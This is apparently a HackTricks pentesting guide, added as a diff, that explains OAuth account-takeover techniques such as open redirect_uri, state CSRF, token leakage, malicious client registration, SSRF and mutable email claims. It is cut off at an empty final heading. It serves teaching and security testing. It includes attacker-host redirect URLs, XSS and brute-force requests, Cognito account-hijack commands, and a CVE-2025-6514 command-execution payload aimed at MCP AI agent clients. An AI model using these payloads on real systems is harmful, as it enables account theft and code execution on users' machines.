@@ -1,0 +1,482 @@
+# OAuth to Account Takeover
+
+{{#include ../banners/hacktricks-training.md}}
+
+## Basic Information <a href="#d4a8" id="d4a8"></a>
+
+OAuth has several versions and grant types; [oauth.net provides a concise OAuth 2.0 overview](https://oauth.net/2/) and a focused guide to the [authorization-code grant](https://oauth.net/2/grant-types/authorization-code/). This page focuses on that widely used grant, an **authorization framework that lets an application access or perform approved actions on a user's resources managed by another service**.<sup>[[24]](#references)</sup>
+
+Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.
+
+It's essential to grasp the following components within the OAuth 2.0 framework:
+
+- **resource owner**: You, as the **user/entity**, authorize access to your resource, like your social media account posts.
+- **resource server**: The **server managing authenticated requests** after the application has secured an `access token` on behalf of the `resource owner`, e.g., **https://socialmedia.com**.
+- **client application**: The **application seeking authorization** from the `resource owner`, such as **https://example.com**.
+- **authorization server**: The **server that issues `access tokens`** to the `client application` following the successful authentication of the `resource owner` and securing authorization, e.g., **https://socialmedia.com**.
+- **client_id**: A public, unique identifier for the application.
+- **client_secret:** A confidential key, known solely to the application and the authorization server, used for generating `access_tokens`.
+- **response_type**: A value specifying **the type of token requested**, like `code`.
+- **scope**: The **level of access** the `client application` is requesting from the `resource owner`.
+- **redirect_uri**: The **URL to which the user is redirected after authorization**. This typically must align with the pre-registered redirect URL.
+- **state**: A parameter to **maintain data across the user's redirection to and from the authorization server**. Its uniqueness is critical for serving as a **CSRF protection mechanism**.
+- **grant_type**: A parameter indicating **the grant type and the type of token to be returned**.
+- **code**: The authorization code from the `authorization server`, used in tandem with `client_id` and `client_secret` by the client application to acquire an `access_token`.
+- **access_token**: The **token that the client application uses for API requests** on behalf of the `resource owner`.
+- **refresh_token**: Enables the application to **obtain a new `access_token` without re-prompting the user**.
+
+### Flow
+
+The **actual OAuth flow** proceeds as follows:
+
+1. You navigate to [https://example.com](https://example.com) and select the “Integrate with Social Media” button.
+2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com) asking for your authorization to let https://example.com’s application access your posts. The request is structured as:
+
+```
+https://socialmedia.com/auth
+?response_type=code
+&client_id=example_clientId
+&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
+&scope=readPosts
+&state=randomString123
+```
+
+3. You are then presented with a consent page.
+4. Following your approval, Social Media sends a response to the `redirect_uri` with the `code` and `state` parameters:
+
+```
+https://example.com?code=uniqueCode123&state=randomString123
+```
+
+5. https://example.com utilizes this `code`, together with its `client_id` and `client_secret`, to make a server-side request to obtain an `access_token` on your behalf, enabling access to the permissions you consented to:
+
+```
+POST /oauth/access_token
+Host: socialmedia.com
+...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
+```
+
+6. Finally, `https://example.com` uses the `access_token` to call the Social Media resource server and access the posts covered by the approved scope.<sup>[[24]](#references)</sup>
+
+## Vulnerabilities <a href="#id-323a" id="id-323a"></a>
+
+### Open redirect_uri <a href="#cc36" id="cc36"></a>
+
+Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Any weakness here lets an attacker send a victim through a malicious authorization URL so that the IdP delivers the victim’s `code` (and `state`) straight to an attacker endpoint, who can then redeem it and harvest tokens.<sup>[[5]](#references)</sup>
+
+Typical attack workflow:
+
+1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.
+2. The victim authenticates and approves the scopes.
+3. The IdP redirects to `attacker.tld/callback?code=<victim-code>&state=...` where the attacker logs the request and immediately exchanges the code.
+
+Common validation bugs to probe:
+
+- **No validation** – any absolute URL is accepted, resulting in instant code theft.
+- **Weak substring/regex checks on the host** – bypass with lookalikes such as `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, or `match.com@evil.com`.
+- **IDN homograph mismatches** – validation happens on the punycode form (`xn--`), but the browser redirects to the Unicode domain controlled by the attacker.
+- **Arbitrary paths on an allowed host** – pointing `redirect_uri` to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript.
+- **Directory constraints without normalization** – patterns like `/oauth/*` can be bypassed with `/oauth/../anything`.
+- **Wildcard subdomains** – accepting `*.example.com` means any takeover (dangling DNS, S3 bucket, etc.) immediately yields a valid callback.
+- **Non-HTTPS callbacks** – letting `http://` URIs through gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit.
+
+Also review auxiliary redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) and the OpenID discovery document (`/.well-known/openid-configuration`) for additional endpoints that might inherit the same validation bugs.
+
+### Redirect token leakage on allowlisted domains with attacker-controlled subpaths
+
+Locking `redirect_uri` to “owned/first-party domains” doesn’t help if any allowlisted domain exposes **attacker-controlled paths or execution contexts** (legacy app platforms, user namespaces, CMS uploads, etc.). If the OAuth/federated login flow **returns tokens in the URL** (query or hash), an attacker can:<sup>[[1]](#references)</sup>
+
+1. Start a legitimate flow to mint a pre-token (e.g., an `etoken` in a multi-step Accounts Center/FXAuth flow).
+2. Send the victim an authorization URL that sets the allowlisted domain as `redirect_uri`/`base_uri` but points `next`/path into an attacker-controlled namespace (e.g., `https://apps.facebook.com/<attacker_app>`).
+3. After the victim approves, the IdP redirects to the attacker-controlled path with sensitive values in the URL (`token`, `blob`, codes, etc.).
+4. JavaScript on that page reads `window.location` and exfiltrates the values despite the domain being “trusted.”
+5. Replay the captured values against downstream privileged endpoints that only expect the redirect-carried tokens. Examples from the FXAuth flow:
+
+```text
+# Account linking without further prompts
+https://accountscenter.facebook.com/add/?auth_flow=frl_linking&blob=<BLOB>&token=<TOKEN>
+
+# Reauth-gated actions (e.g., profile updates) without user confirmation
+https://accountscenter.facebook.com/profiles/<VICTIM_ID>/name/?auth_flow=reauth&blob=<BLOB>&token=<TOKEN>
+```
+
+### XSS in redirect implementation <a href="#bda5" id="bda5"></a>
+
+As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**.<sup>[[16]](#references)</sup> Possible payload to test:
+
+```
+https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
+```
+
+### OAuth callback error pages: reflected `error_description`, trusted-origin phishing, and encoded `state` leakage
+
+Some OAuth integrations use a **first-party callback page** to render login failures after the IdP redirects the browser back. These pages are high value because they already run on a **trusted origin** and often consume attacker-controlled parameters such as `error`, `error_description`, `message`, `description`, or `state`.<sup>[[8]](#references)</sup>
+
+- **Reflecting `error_description` into HTML** without strict output encoding turns the callback into a **trusted-origin phishing page**. Even when `<script>` is filtered, HTML injection can still spoof the entire failure page and instruct the victim to perform attacker-chosen actions.
+- **WAFs often key on common handlers** such as `onload`/`onerror`. When normal payloads are blocked, try **browser-specific or uncommon events** that defenders may not blacklist. A practical example is Safari's `onpagereveal`, which can execute when the malicious callback page is shown in Safari:<sup>[[9]](#references)</sup>
+
+```html
+<body onpagereveal=open("https://attacker.example")>
+This step can only be completed in Safari
+```
+
+- **Test self-referential payloads**: if the injected HTML/JS can reopen or reload the same callback URL, you may get **client-side resource exhaustion**, repeated popups/tabs, or **log flooding** on every render.
+- **Always decode opaque-looking `state` values**. Many implementations Base64-encode JSON or user metadata and assume that is "hidden". Base64 is reversible, so callback URLs may leak **PII** such as email addresses, tenant identifiers, return paths, or internal workflow state.
+- **Treat URL exposure as part of the bug**: anything placed in the callback URL can later appear in browser history, reverse proxies, load balancers, app logs, monitoring tools, screenshots, and `Referer` headers if the page loads third-party resources.
+
+Quick checks during testing:
+
+1. Trigger both success and failure OAuth callbacks and capture the full URL plus rendered HTML.
+2. Replay the callback while mutating `error_description`, `message`, and similar error fields with plain text, HTML, and event-handler payloads.
+3. Decode `state` as Base64/URL-safe Base64 and inspect it for PII or application state that should have stayed server-side.
+4. Repeat browser-specific payloads in Safari/WebKit when the WAF blocks standard inline-event XSS probes.
+
+### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>
+
+The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.<sup>[[5]](#references)</sup>
+
+The replay pattern is always the same:
+
+1. The attacker authenticates against the IdP with their account and intercepts the last redirect containing `code` (and any `state`).
+2. They drop that request, keep the URL, and later abuse any CSRF primitive (link, iframe, auto-submitting form) to force the victim browser to load it.
+3. If the client does not enforce `state`, the application consumes the attacker’s authorization result and logs the attacker into the victim’s app account.
+
+A practical checklist for `state` handling during tests:
+
+- **Missing `state` entirely** – if the parameter never appears, the whole login is CSRFable.
+- **`state` not required** – remove it from the initial request; if the IdP still issues codes that the client accepts, the defense is opt-in.
+- **Returned `state` not validated** – tamper with the value in the response (Burp, MITM proxy). Accepting mismatched values means the stored token is never compared.
+- **Predictable or purely data-driven `state`** – many apps stuff redirect paths or JSON blobs into `state` without mixing in randomness, letting attackers guess valid values and replay flows. Always prepend/append strong entropy before encoding data.
+- **`state` fixation** – if the app lets users supply the `state` value (e.g., via crafted authorization URLs) and reuses it throughout the flow, an attacker can lock in a known value and reuse it across victims.
+
+PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.
+
+### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>
+
+1. **Without Email Verification on Account Creation**: Attackers can preemptively create an account using the victim's email. If the victim later uses a third-party service for login, the application might inadvertently link this third-party account to the attacker's pre-created account, leading to unauthorized access.<sup>[[2]](#references)</sup>
+2. **Exploiting Lax OAuth Email Verification**: Attackers may exploit OAuth services that don't verify emails by registering with their service and then changing the account email to the victim's. This method similarly risks unauthorized account access, akin to the first scenario but through a different attack vector.
+
+### Disclosure of Secrets <a href="#e177" id="e177"></a>
+
+The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:<sup>[[5]](#references)</sup>
+
+- Unpacking the APK/IPA, desktop installer, or Electron app and grepping for `client_secret`, Base64 blobs that decode to JSON, or hard-coded OAuth endpoints.
+- Reviewing bundled config files (plist, JSON, XML) or decompiled strings for client credentials.
+
+Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance code verifier instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.
+
+### Client Secret Bruteforce
+
+You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.<sup>[[2]](#references)</sup>\
+The request to BF may look similar to:
+
+```
+POST /token HTTP/1.1
+content-type: application/x-www-form-urlencoded
+host: 10.10.10.10:3000
+content-length: 135
+Connection: close
+
+code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
+```
+
+### Referer/Header/Location artifacts leaking Code + State
+
+Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak.<sup>[[7]](#references)</sup> Two recurring patterns:
+
+- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
+- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.
+
+### Access Token Stored in Browser History
+
+The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise.<sup>[[5]](#references)</sup> Always check for:
+
+- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
+- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
+- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
+- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.
+
+Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.
+
+### Frontend-only SSO gates: MSAL/OAuth login spoofing, `localStorage` identity injection, and pre-auth session bootstrap
+
+Some SPAs use **MSAL/OIDC only as a client-side route guard**: the bundle checks `getAllAccounts()` (or equivalent), writes identity fields into `localStorage`, and renders the “private” UI. If the backend **doesn't validate the bearer token server-side** on every API call, patching the JavaScript is enough to expose protected routes and prove missing authorization.<sup>[[13]](#references)</sup>
+
+Practical workflow during testing:
+
+1. **Download the JS bundle before/around the SSO redirect**. Even when the browser immediately jumps to Microsoft login, React/Next/Vue assets often load first and disclose hidden routes, API names, storage keys, role strings, and session bootstrap endpoints.
+2. **Patch the account-check logic locally** so the SPA believes one user is signed in (e.g. force the MSAL account lookup to return a non-empty list or short-circuit the redirect branch). This should only unlock client rendering; it must not grant server data by itself.
+3. **Replay the underlying APIs without the real token**: remove the `Authorization` header, replace it with garbage, or call the endpoint directly outside the browser. If responses still succeed, the backend is not enforcing bearer-token validation.
+4. **Treat browser storage as attacker-controlled**. If the app stores `username`, employee IDs, tenant/company IDs, `role`, `isAdmin`, or similar values in `localStorage`/`sessionStorage`, overwrite them with another valid user's values and reload. Any privilege change means the server is trusting client-supplied identity state.
+5. **Inspect session bootstrap code**. A common follow-on bug is an unauthenticated `GET` that returns a session GUID / opaque session ID plus an expiry timestamp. If dropping those values into storage is enough to “complete” login, the session is being minted pre-auth and is not bound server-side to the authenticated identity.
+6. **Check for static secrets shipped to the browser** such as `x-api-key`, AWS API Gateway keys, or encrypted constants that the same bundle later decrypts. These values are **public** once delivered to the client and cannot prove who the user is.
+
+High-signal indicators:
+
+- Sensitive APIs work with **no bearer token**, a **tampered bearer token**, or only a **browser-exposed static API key**.
+- The SPA derives identity from `localStorage` and the API accepts those values as truth.
+- Session creation happens through an **unauthenticated bootstrap endpoint** that returns a reusable GUID/opaque token.
+- “Client-side encryption” is used to hide API keys, usernames, or session material inside the bundle. If the browser can decrypt it, the attacker can too.
+
+For Microsoft Entra / MSAL-backed APIs, the resource server must validate at least the **signature**, **issuer**, **audience**, **expiration**, and then enforce the expected **scopes / app roles / tenant authorization** before returning any sensitive data.<sup>[[14]](#references)</sup><sup>[[15]](#references)</sup>
+
+### Everlasting Authorization Code
+
+Authorization codes must be **short-lived, single-use, and replay-aware**.<sup>[[5]](#references)</sup> When assessing a flow, capture a `code` and:
+
+- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
+- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
+- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
+- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.
+
+Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.
+
+### Authorization/Refresh Token not bound to client
+
+If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts.<sup>[[7]](#references)</sup> Test for weak binding by:
+
+- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
+- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
+- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.
+
+Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.
+
+### Happy Paths, XSS, Iframes & Post Messages to leak code & state values
+
+[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)<sup>[[17]](#references)</sup>
+
+### AWS Cognito <a href="#bda5" id="bda5"></a>
+
+In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.<sup>[[18]](#references)</sup>
+
+```bash
+# Read info of the user
+aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
+
+# Change email address
+aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
+{
+    "CodeDeliveryDetailsList": [
+        {
+            "Destination": "i***@f***.com",
+            "DeliveryMedium": "EMAIL",
+            "AttributeName": "email"
+        }
+    ]
+}
+```
+
+For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).
+
+### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>
+
+As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.<sup>[[19]](#references)</sup>
+
+This is because an **attacker** could create an **application supporting OAuth and login with Facebook** (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.
+
+> [!CAUTION]
+> Therefore, if the attacker manages to get the user access his own OAuth application, he will be able to take over the victims account in applications that are expecting a token and aren't checking if the token was granted to their app ID.
+
+### Two links & cookie <a href="#bda5" id="bda5"></a>
+
+According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), an attacker could make a victim open a page whose **`returnUrl`** pointed to the attacker's host. The value was stored in an `RU` cookie, and a later prompt asked whether the user wanted to grant that host access.<sup>[[20]](#references)</sup>
+
+The attacker could initiate the **OAuth flow** in one tab to set the `RU` cookie, close it before the warning appeared, and open a new tab without the visible `returnUrl`. The new prompt omitted the attacker's host even though the cookie still caused the token to be redirected there.
+
+### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>
+
+As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations accept **`prompt=none`** to avoid interactive confirmation when the user is already logged in.<sup>[[21]](#references)</sup>
+
+### response_mode
+
+As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), **`response_mode`** can select how the authorization response is returned:<sup>[[21]](#references)</sup>
+
+- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
+- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
+- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
+- `response_mode=web_message` -> The code is sent in a postMessage payload: `window.opener.postMessage({"code": "asdasdasd...`
+
+### Clickjacking OAuth consent dialogs
+
+OAuth consent/login dialogs are ideal clickjacking targets: if they can be framed, an attacker can overlay custom graphics, hide the real buttons, and trick users into approving dangerous scopes or linking accounts.<sup>[[5]](#references)</sup> Build PoCs that:
+
+1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
+2. Use absolute positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.
+3. Optionally pre-fill parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.
+
+During testing verify that IdP pages emit either `X-Frame-Options: DENY/SAMEORIGIN` or a restrictive `Content-Security-Policy: frame-ancestors 'none'`. If neither is present, demonstrate the risk with tooling like [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) and record how easily a victim authorizes the attacker’s app. For additional payload ideas see [Clickjacking](clickjacking.md).
+
+### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>
+
+According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), the Resource Owner Password Credentials flow accepts a **username and password** directly. If that path returns a broadly privileged token without enforcing the account's second factor, the token can bypass 2FA.<sup>[[22]](#references)</sup>
+
+### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>
+
+This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO.<sup>[[23]](#references)</sup> The attack was:
+
+1. The victim visits the attacker's web page.
+2. The victim opens a malicious link, and a new window starts the Google OAuth flow with `response_type=id_token,code&prompt=none`, retaining the **attacker's site as the referrer**.
+3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter (victim web) with 30X code which still keeps the attackers website in the referer.
+4. The victim site **triggers its referrer-based open redirect** back to the attacker's site. Because **`response_type`** was **`id_token,code`**, the fragment carries the authorization response to the attacker, enabling account takeover on the victim site.
+
+### Open Dynamic Client Registration + PKCE-enabled malicious client flows
+
+If the authorization server exposes `/.well-known/oauth-authorization-server` or `/.well-known/openid-configuration`, inspect it for a **`registration_endpoint`**, supported grant types, and `token_endpoint_auth_methods_supported`. A combination such as **dynamic client registration + `authorization_code` + `none` client auth + PKCE** means the platform may allow attacker-created **public clients**.<sup>[[12]](#references)</sup>
+
+Quick recon:
+
+```bash
+curl -s https://target/.well-known/oauth-authorization-server
+```
+
+Interesting signals in the metadata:
+
+- `registration_endpoint` is reachable from the internet.
+- `token_endpoint_auth_methods_supported` contains `none`.
+- `code_challenge_methods_supported` contains `S256`.
+
+If `POST /register` is unauthenticated, try registering an attacker-controlled callback:
+
+```json
+{"redirect_uris":["https://attacker.com/callback"]}
+```
+
+This is **more dangerous than a normal open `redirect_uri` bug** because the attacker becomes a **legitimate client** from the IdP perspective. After that, the workflow is:
+
+1. Register the malicious client and keep the returned `client_id` (and `client_secret` if any).
+2. Generate your own PKCE `code_verifier` / `code_challenge` pair.
+3. Send the victim to a normal OAuth authorize URL using your `client_id` and `redirect_uri`.
+4. If the victim approves the consent screen, the authorization server sends **their** code to **your** callback.
+5. Exchange the code with your known verifier and obtain victim tokens.
+
+PKCE does **not** stop this pattern when the attacker controls the entire OAuth client lifecycle. PKCE protects against **code interception by a third party**; it does not protect against a **malicious registered client** that generated the `code_challenge` itself.
+
+Extra checks during testing:
+
+- The registration endpoint should require authentication, approval, or ownership validation for `redirect_uris`.
+- `redirect_uris` should be matched exactly and not accept arbitrary attacker domains.
+- If the metadata advertises public-client token auth (`none`), verify whether this is only allowed for trusted clients and whether token redemption still enforces the correct `client_id`, `redirect_uri`, and PKCE verifier.
+- If the authorization API returns authorization data or a redirect target **before** a user session is established, treat that as a broken authorization/authentication boundary and chain it with the malicious-client flow above.
+- Wildcard CORS on OAuth endpoints is not usually the root cause of the account takeover, but it can expand browser-based abuse and should be reported as an impact amplifier.
+
+### SSRFs parameters <a href="#bda5" id="bda5"></a>
+
+[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**<sup>[[3]](#references)</sup>
+
+Dynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities, specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details about client applications, including sensitive URLs that could be exploited.
+
+**Key Points:**
+
+- **Dynamic Client Registration** is often mapped to `/register` and accepts details like `client_name`, `client_secret`, `redirect_uris`, and URLs for logos or JSON Web Key Sets (JWKs) via POST requests.
+- This feature adheres to specifications laid out in **RFC7591** and **OpenID Connect Registration 1.0**, which include parameters potentially vulnerable to SSRF.
+- The registration process can inadvertently expose servers to SSRF in several ways:
+  - **`logo_uri`**: A URL for the client application's logo that might be fetched by the server, triggering SSRF or leading to XSS if the URL is mishandled.
+  - **`jwks_uri`**: A URL to the client's JWK document, which if maliciously crafted, can cause the server to make outbound requests to an attacker-controlled server.
+  - **`sector_identifier_uri`**: References a JSON array of `redirect_uris`, which the server might fetch, creating an SSRF opportunity.
+  - **`request_uris`**: Lists allowed request URIs for the client, which can be exploited if the server fetches these URIs at the start of the authorization process.
+
+**Exploitation Strategy:**
+
+- SSRF can be triggered by registering a new client with malicious URLs in parameters like `logo_uri`, `jwks_uri`, or `sector_identifier_uri`.
+- While direct exploitation via `request_uris` may be mitigated by whitelist controls, supplying a pre-registered, attacker-controlled `request_uri` can facilitate SSRF during the authorization phase.
+
+### OAuth/OIDC Discovery URL Abuse & OS Command Execution
+
+Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.<sup>[[6]](#references)</sup>
+
+**Attack workflow**
+
+1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
+2. The server answers with JSON such as:
+
+```
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "authorization_endpoint": "file:/c:/windows/system32/calc.exe",
+  "token_endpoint": "https://evil/idp/token",
+  ...
+}
+```
+
+3. The client launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc '<payload>'` if registered.
+4. Because this happens before any user interaction, **merely configuring the client to talk to the attacker server yields code execution**.
+
+**How to test**
+
+- Target any OAuth-capable desktop/agent that performs discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).
+- Intercept or host the discovery response and replace `authorization_endpoint`, `device_authorization_endpoint`, or similar fields with `file://`, `cmd://`, UNC paths, or other dangerous schemes.
+- Observe whether the client validates the scheme/host. Lack of validation results in immediate execution under the user context and proves the issue.
+- Repeat with different schemes to map the full attack surface (e.g., `ms-excel:`, `data:text/html,`, custom protocol handlers) and demonstrate cross-platform reach.
+
+## OAuth providers Race Conditions
+
+If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).
+
+## Mutable Claims Attack
+
+In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:
+
+- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
+- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
+- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
+- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).<sup>[[4]](#references)</sup>
+
+A common variant appears when the **OAuth/OIDC provider itself accepts arbitrary unverified emails** during local signup and later returns that same `email` to relying parties during federated login. This turns a seemingly harmless product decision ("verify email later") into a **combinatorial bug** once third-party sites trust the provider's identity claims:<sup>[[10]](#references)</sup>
+
+1. The attacker creates an account at the provider with `victim@company.com` but never proves mailbox ownership.
+2. A relying party allows "Login with Provider" and links/logs in users by matching the returned `email`.
+3. The attacker authenticates to the provider and completes the OAuth flow.
+4. The relying party receives `email=victim@company.com` and binds the session to the victim's local account.
+
+Practical testing notes:
+
+- As a **provider**, verify whether the platform returns `email` for accounts that never completed verification, or fails to expose `email_verified=false` in the ID Token / UserInfo response.
+- As a **relying party**, test whether an existing local account can be accessed by sending an unverified `email` claim from a lab IdP or from a real provider with lax verification.
+- Check whether the application binds identity to **`iss` + `sub`** (stable) or to `email` / `preferred_username` (mutable, recycled, or unverified).
+- Review auto-linking logic separately from first-time signup: many apps reject new unverified users but still **merge into existing accounts** on email match alone.
+
+> [!CAUTION]
+> Per OpenID Connect, `email_verified=true` is the flag that tells the RP the provider actually verified mailbox control, and `iss` + `sub` are the only stable user identifiers. If the provider omits verification state or the RP ignores it, treat the email as untrusted until a **local verification step** completes.<sup>[[11]](#references)</sup>
+
+## Client Confusion Attack
+
